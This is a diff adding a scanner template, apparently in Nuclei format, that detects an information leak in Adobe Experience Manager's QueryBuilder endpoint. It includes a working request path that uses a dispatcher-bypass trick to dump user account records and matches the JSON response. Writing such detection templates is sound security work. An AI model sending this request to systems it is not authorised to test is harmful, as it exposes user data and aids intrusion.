@@ -1,0 +1,17 @@
+id: aem-querybuilder-info-leak
+info:
+  name: Adobe Experience Manager (AEM) QueryBuilder Info Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-disclosure,aem
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{"success":true,"results"'
+          - "jcr"
+        part: body
